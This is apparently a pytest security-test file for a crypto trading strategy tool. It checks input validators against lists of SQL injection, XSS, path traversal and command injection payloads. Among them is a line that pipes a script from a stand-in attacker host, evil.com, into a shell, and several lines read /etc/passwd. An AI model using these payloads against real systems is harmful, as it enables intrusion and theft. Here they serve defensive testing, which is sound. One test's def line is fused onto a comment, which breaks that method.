"""
Security Hardening Tests for Bybit Strategy Tester.

Tests for:
- SQL Injection prevention
- XSS prevention
- CSRF protection
- Rate limiting
- Authentication bypass
- Input validation
- Sensitive data exposure
"""

import json
import re
from typing import Any

import pytest

# ============================================================================
# Test Data Constants
# ============================================================================

SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1; DELETE FROM orders WHERE '1'='1",
    "UNION SELECT * FROM users--",
    "'; EXEC xp_cmdshell('dir'); --",
    "1' AND (SELECT COUNT(*) FROM users) > 0--",
    "admin'--",
    "' OR 1=1#",
    "1'; WAITFOR DELAY '00:00:10'--",
    "'; INSERT INTO logs VALUES('hacked'); --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<div style=\"background:url(javascript:alert('XSS'))\">",
    "{{7*7}}",  # Template injection
    "${7*7}",  # Template injection
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..;/..;/..;/etc/passwd",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "& ping -c 10 127.0.0.1 &",
    "|| curl evil.com/malware.sh | sh",
    "\ncat /etc/passwd",
]


# ============================================================================
# Input Validation Tests
# ============================================================================


class TestInputValidation:
    """Test input validation against malicious payloads."""

    def test_symbol_validation_rejects_sql_injection(self):
        """Symbol field should reject SQL injection attempts."""
        from pydantic import BaseModel, Field, field_validator

        class SymbolInput(BaseModel):
            symbol: str = Field(..., min_length=3, max_length=20)

            @field_validator("symbol")
            @classmethod
            def validate_symbol(cls, v: str) -> str:
                v = v.upper().strip()
                if not re.match(r"^[A-Z0-9]+$", v):
                    raise ValueError("Invalid symbol format")
                return v

        for payload in SQL_INJECTION_PAYLOADS:
            with pytest.raises(ValueError):
                SymbolInput(symbol=payload)

    def test_symbol_validation_rejects_xss(self):
        """Symbol field should reject XSS attempts."""
        from pydantic import BaseModel, Field, field_validator

        class SymbolInput(BaseModel):
            symbol: str = Field(..., min_length=3, max_length=20)

            @field_validator("symbol")
            @classmethod
            def validate_symbol(cls, v: str) -> str:
                v = v.upper().strip()
                if not re.match(r"^[A-Z0-9]+$", v):
                    raise ValueError("Invalid symbol format")
                return v

        for payload in XSS_PAYLOADS:
            with pytest.raises((ValueError, Exception)):
                SymbolInput(symbol=payload)

    def test_order_side_validation(self):
        """Order side should only accept valid values."""
        from pydantic import BaseModel, Field

        class OrderInput(BaseModel):
            side: str = Field(..., pattern="^(buy|sell|long|short)$")

        # Valid sides
        valid = OrderInput(side="buy")
        assert valid.side == "buy"

        # Invalid sides
        for invalid_side in ["BUY", "SELL", "hack", "'; DROP--", "<script>"]:
            with pytest.raises(ValueError):
                OrderInput(side=invalid_side)

    def test_quantity_validation_rejects_negative(self):
        """Quantity should reject negative and extreme values."""
        from pydantic import BaseModel, Field

        class QuantityInput(BaseModel):
            quantity: float = Field(..., gt=0, le=1000000)

        # Valid
        valid = QuantityInput(quantity=100.0)
        assert valid.quantity == 100.0

        # Invalid
        invalid_values = [-1, 0, -100, 1000001, float("inf")]
        for val in invalid_values:
            with pytest.raises((ValueError, Exception)):
                QuantityInput(quantity=val)

    def test_price_validation(self):
        """Price should only accept positive numbers."""

        from pydantic import BaseModel, Field

        class PriceInput(BaseModel):
            price: float | None = Field(None, gt=0)

        # Valid
        valid = PriceInput(price=50000.0)
        assert valid.price == 50000.0

        # None is allowed
        valid_none = PriceInput(price=None)
        assert valid_none.price is None

        # Invalid
        with pytest.raises(ValueError):
            PriceInput(price=-100)


# ============================================================================
# SQL Injection Prevention Tests
# ============================================================================


class TestSQLInjectionPrevention:
    """Test SQL injection prevention across the application."""

    def test_parameterized_query_usage(self):
        """Verify parameterized queries prevent SQL injection."""

        # Simulate parameterized query behavior
        def safe_query(user_input: str) -> tuple:
            """Return query with parameters separated."""
            query = "SELECT * FROM orders WHERE symbol = $1"
            params = (user_input,)
            return query, params

        for payload in SQL_INJECTION_PAYLOADS:
            query, params = safe_query(payload)
            # Payload stays in params, not interpolated into query
            assert "$1" in query
            assert payload in params
            assert payload not in query

    def test_orm_escape_handling(self):
        """Test that ORM properly escapes special characters."""

        # Simulate ORM escape behavior
        def escape_string(value: str) -> str:
            """Escape dangerous characters."""
            return value.replace("'", "''").replace("\\", "\\\\")

        test_input = "'; DROP TABLE users; --"
        escaped = escape_string(test_input)
        assert "''" in escaped
        assert "DROP TABLE users" in escaped  # Still there but escaped

    def test_input_sanitization_removes_dangerous_patterns(self):
        """Test dangerous SQL patterns are detected."""

        def detect_sql_patterns(value: str) -> bool:
            """Detect potential SQL injection patterns."""
            patterns = [
                r"(\s|^)(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)(\s|$)",
                r"--",
                r";",
                r"'",
                r"\/\*",
                r"\*\/",
                r"xp_",
                r"EXEC(\s|$)",
            ]
            value_upper = value.upper()
            return any(re.search(p, value_upper, re.IGNORECASE) for p in patterns)

        for payload in SQL_INJECTION_PAYLOADS:
            assert detect_sql_patterns(payload), f"Failed to detect: {payload}"


# ============================================================================
# XSS Prevention Tests
# ============================================================================


class TestXSSPrevention:
    """Test XSS prevention measures."""

    def test_html_encoding_applied(self):
        """Test HTML encoding prevents script execution."""
        import html

        for payload in XSS_PAYLOADS:
            encoded = html.escape(payload)
            # Script tags should be encoded
            assert "<script>" not in encoded.lower()
            # javascript: protocol should be escaped or intact but not executable
            # HTML escape doesn't change javascript: but it's safe in text context    def test_json_response_content_type(self):
        """Verify JSON responses have correct content type."""
        # Simulate API response headers check
        expected_content_type = "application/json"

        # This would be checked in actual API responses
        response_headers = {"Content-Type": "application/json; charset=utf-8"}
        assert expected_content_type in response_headers["Content-Type"]

    def test_dangerous_tags_detection(self):
        """Test detection of dangerous HTML tags."""

        def detect_xss(value: str) -> bool:
            """Detect potential XSS patterns."""
            patterns = [
                r"<\s*script",
                r"<\s*iframe",
                r"<\s*object",
                r"<\s*embed",
                r"<\s*svg",
                r"on\w+\s*=",
                r"javascript\s*:",
                r"data\s*:",
                r"vbscript\s*:",
            ]
            return any(re.search(p, value, re.IGNORECASE) for p in patterns)

        for payload in XSS_PAYLOADS:
            if "<" in payload or "javascript:" in payload.lower():
                assert detect_xss(payload), f"Failed to detect: {payload}"


# ============================================================================
# Path Traversal Prevention Tests
# ============================================================================


class TestPathTraversalPrevention:
    """Test path traversal prevention."""

    def test_path_normalization(self):
        """Test path normalization prevents traversal."""
        import os

        base_dir = "/app/data"

        def safe_path_join(base: str, user_path: str) -> str:
            """Safely join paths preventing traversal."""
            # Normalize and resolve
            full_path = os.path.normpath(os.path.join(base, user_path))
            # Check if still under base
            if not full_path.startswith(base):
                raise ValueError("Path traversal detected")
            return full_path

        for payload in PATH_TRAVERSAL_PAYLOADS:
            with pytest.raises(ValueError):
                safe_path_join(base_dir, payload)

    def test_dot_dot_slash_detection(self):
        """Test detection of ../ patterns."""

        def detect_traversal(path: str) -> bool:
            """Detect path traversal attempts."""
            patterns = [
                r"\.\./",
                r"\.\.\\",
                r"%2e%2e",
                r"%252e",
                r"\.\.;",
                r"\.\.",  # Basic .. detection
            ]
            return any(re.search(p, path, re.IGNORECASE) for p in patterns)

        for payload in PATH_TRAVERSAL_PAYLOADS:
            if ".." in payload or "%2e" in payload.lower() or "%252" in payload.lower():
                assert detect_traversal(payload), f"Failed to detect: {payload}"


# ============================================================================
# Rate Limiting Tests
# ============================================================================


class TestRateLimiting:
    """Test rate limiting functionality."""

    def test_rate_limiter_blocks_excessive_requests(self):
        """Test rate limiter blocks after threshold."""

        class SimpleRateLimiter:
            def __init__(self, max_requests: int, window_seconds: int):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests: dict[str, list[float]] = {}

            def is_allowed(self, client_id: str, current_time: float) -> bool:
                if client_id not in self.requests:
                    self.requests[client_id] = []

                # Remove old requests
                self.requests[client_id] = [
                    t
                    for t in self.requests[client_id]
                    if current_time - t < self.window_seconds
                ]

                if len(self.requests[client_id]) >= self.max_requests:
                    return False

                self.requests[client_id].append(current_time)
                return True

        limiter = SimpleRateLimiter(max_requests=5, window_seconds=60)
        client = "test_client"
        current_time = 1000.0

        # First 5 requests should pass
        for i in range(5):
            assert limiter.is_allowed(client, current_time + i)

        # 6th request should be blocked
        assert not limiter.is_allowed(client, current_time + 5)

    def test_rate_limiter_allows_after_window(self):
        """Test rate limiter allows requests after window expires."""

        class SimpleRateLimiter:
            def __init__(self, max_requests: int, window_seconds: int):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests: dict[str, list[float]] = {}

            def is_allowed(self, client_id: str, current_time: float) -> bool:
                if client_id not in self.requests:
                    self.requests[client_id] = []

                self.requests[client_id] = [
                    t
                    for t in self.requests[client_id]
                    if current_time - t < self.window_seconds
                ]

                if len(self.requests[client_id]) >= self.max_requests:
                    return False

                self.requests[client_id].append(current_time)
                return True

        limiter = SimpleRateLimiter(max_requests=2, window_seconds=10)
        client = "test_client"

        # Use up limit
        assert limiter.is_allowed(client, 0.0)
        assert limiter.is_allowed(client, 1.0)
        assert not limiter.is_allowed(client, 2.0)

        # After window expires, should allow again
        assert limiter.is_allowed(client, 15.0)


# ============================================================================
# Authentication Security Tests
# ============================================================================


class TestAuthenticationSecurity:
    """Test authentication security measures."""

    def test_api_key_format_validation(self):
        """Test API key format validation."""

        def validate_api_key(key: str) -> bool:
            """Validate API key format."""
            if not key:
                return False
            # API key should be alphanumeric, 32-64 chars
            if not re.match(r"^[A-Za-z0-9]{32,64}$", key):
                return False
            return True

        # Valid keys
        assert validate_api_key("A" * 32)
        assert validate_api_key("a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6")

        # Invalid keys
        assert not validate_api_key("")
        assert not validate_api_key("short")
        assert not validate_api_key("has spaces in it and special chars!")
        assert not validate_api_key(SQL_INJECTION_PAYLOADS[0])

    def test_sensitive_headers_not_logged(self):
        """Test sensitive headers are redacted in logs."""
        sensitive_headers = ["Authorization", "X-API-Key", "Cookie", "X-CSRF-Token"]

        def redact_headers(headers: dict) -> dict:
            """Redact sensitive headers for logging."""
            redacted = {}
            for key, value in headers.items():
                if key.lower() in [h.lower() for h in sensitive_headers]:
                    redacted[key] = "***REDACTED***"
                else:
                    redacted[key] = value
            return redacted

        headers = {
            "Authorization": "Bearer secret_token",
            "X-API-Key": "my_secret_key",
            "Content-Type": "application/json",
        }

        redacted = redact_headers(headers)
        assert redacted["Authorization"] == "***REDACTED***"
        assert redacted["X-API-Key"] == "***REDACTED***"
        assert redacted["Content-Type"] == "application/json"


# ============================================================================
# Sensitive Data Protection Tests
# ============================================================================


class TestSensitiveDataProtection:
    """Test protection of sensitive data."""

    def test_api_keys_not_in_responses(self):
        """Test API keys are not exposed in responses."""
        response_data = {
            "user_id": "123",
            "email": "user@example.com",
            "api_key": "secret_key_12345",
            "balance": 1000.0,
        }

        def sanitize_response(data: dict) -> dict:
            """Remove sensitive fields from response."""
            sensitive_fields = ["api_key", "secret", "password", "token"]
            return {k: v for k, v in data.items() if k.lower() not in sensitive_fields}

        sanitized = sanitize_response(response_data)
        assert "api_key" not in sanitized
        assert "user_id" in sanitized

    def test_password_not_logged(self):
        """Test passwords are never logged."""

        def sanitize_for_log(data: Any) -> Any:
            """Sanitize data for logging."""
            if isinstance(data, dict):
                return {
                    k: "***" if "password" in k.lower() else sanitize_for_log(v)
                    for k, v in data.items()
                }
            return data

        login_request = {
            "username": "admin",
            "password": "super_secret_123",
            "remember_me": True,
        }

        sanitized = sanitize_for_log(login_request)
        assert sanitized["password"] == "***"
        assert sanitized["username"] == "admin"

    def test_error_messages_dont_leak_info(self):
        """Test error messages don't leak sensitive information."""

        def safe_error_message(error: Exception, is_production: bool = True) -> str:
            """Generate safe error message."""
            if is_production:
                return "An error occurred. Please try again later."
            return str(error)

        # Simulated database error with sensitive info
        db_error = Exception(
            "Connection to postgres://admin:password@db:5432/app failed"
        )

        # In production, should not expose connection string
        safe_msg = safe_error_message(db_error, is_production=True)
        assert "postgres://" not in safe_msg
        assert "password" not in safe_msg


# ============================================================================
# CORS and Headers Security Tests
# ============================================================================


class TestSecurityHeaders:
    """Test security headers configuration."""

    def test_cors_not_wildcard_in_production(self):
        """Test CORS is not set to wildcard in production."""
        production_cors_origins = [
            "https://app.example.com",
            "https://api.example.com",
        ]

        # Should not include wildcard
        assert "*" not in production_cors_origins

    def test_security_headers_present(self):
        """Test required security headers are configured."""
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
        }

        # Verify all headers have values
        for header, value in required_headers.items():
            assert value, f"Header {header} should have a value"

    def test_no_server_version_disclosure(self):
        """Test server version is not disclosed in headers."""
        # Simulated response headers
        response_headers = {
            "Content-Type": "application/json",
            "X-Request-ID": "abc123",
            # Should NOT have:
            # "Server": "uvicorn 0.25.0"
            # "X-Powered-By": "FastAPI"
        }

        forbidden_headers = ["Server", "X-Powered-By", "X-AspNet-Version"]
        for header in forbidden_headers:
            assert header not in response_headers


# ============================================================================
# JSON Security Tests
# ============================================================================


class TestJSONSecurity:
    """Test JSON handling security."""

    def test_json_depth_limit(self):
        """Test deeply nested JSON is rejected."""

        def create_nested_json(depth: int) -> dict:
            """Create deeply nested JSON object."""
            result: dict[str, Any] = {}
            current = result
            for i in range(depth):
                current["nested"] = {}
                current = current["nested"]
            return result

        def validate_json_depth(
            data: dict, max_depth: int = 10, current_depth: int = 0
        ) -> bool:
            """Validate JSON depth doesn't exceed limit."""
            if current_depth > max_depth:
                return False
            if isinstance(data, dict):
                for value in data.values():
                    if not validate_json_depth(value, max_depth, current_depth + 1):
                        return False
            elif isinstance(data, list):
                for item in data:
                    if not validate_json_depth(item, max_depth, current_depth + 1):
                        return False
            return True

        # Normal depth should pass
        normal = create_nested_json(5)
        assert validate_json_depth(normal)

        # Excessive depth should fail
        deep = create_nested_json(20)
        assert not validate_json_depth(deep)

    def test_json_size_limit(self):
        """Test large JSON payloads are rejected."""
        max_size_bytes = 1024 * 1024  # 1MB

        # Small payload should pass
        small_payload = json.dumps({"key": "value"})
        assert len(small_payload.encode()) < max_size_bytes

        # Large payload should fail
        large_payload = json.dumps({"data": "x" * (max_size_bytes + 1)})
        assert len(large_payload.encode()) > max_size_bytes


# ============================================================================
# Integration Security Tests
# ============================================================================


class TestSecurityIntegration:
    """Integration tests for security measures."""

    @pytest.mark.asyncio
    async def test_full_request_validation_pipeline(self):
        """Test complete request validation pipeline."""
        from pydantic import BaseModel, Field, field_validator

        class SecureOrderRequest(BaseModel):
            symbol: str = Field(..., min_length=3, max_length=20)
            side: str = Field(..., pattern="^(buy|sell)$")
            quantity: float = Field(..., gt=0, le=1000000)

            @field_validator("symbol")
            @classmethod
            def validate_symbol(cls, v: str) -> str:
                v = v.upper().strip()
                if not re.match(r"^[A-Z0-9]+$", v):
                    raise ValueError("Invalid symbol")
                return v

        # Valid request passes
        valid = SecureOrderRequest(symbol="BTCUSDT", side="buy", quantity=1.0)
        assert valid.symbol == "BTCUSDT"

        # All attack vectors should fail
        attack_vectors = [
            {"symbol": SQL_INJECTION_PAYLOADS[0], "side": "buy", "quantity": 1.0},
            {"symbol": XSS_PAYLOADS[0], "side": "buy", "quantity": 1.0},
            {"symbol": "BTCUSDT", "side": SQL_INJECTION_PAYLOADS[0], "quantity": 1.0},
        ]

        for attack in attack_vectors:
            with pytest.raises((ValueError, Exception)):
                SecureOrderRequest(**attack)

    def test_security_bypass_attempts(self):
        """Test various security bypass attempts."""
        bypass_attempts = [
            # Unicode bypass
            "ＳＥＬＥＣＴ﻿ * FROM users",
            # Case variation
            "SeLeCt * FrOm users",
            # Null byte injection
            "admin\x00",
            # URL encoding bypass
            "%27%20OR%20%271%27=%271",
        ]

        def detect_bypass_attempt(value: str) -> bool:
            """Detect security bypass attempts."""
            # Normalize unicode
            import unicodedata

            normalized = unicodedata.normalize("NFKC", value)

            # Check for SQL keywords
            sql_keywords = ["SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "UNION"]
            upper = normalized.upper()

            return any(kw in upper for kw in sql_keywords)

        for attempt in bypass_attempts:
            if "SELECT" in attempt.upper() or "ＳＥＬＥＣＴ" in attempt:
                assert detect_bypass_attempt(attempt), f"Failed to detect: {attempt}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
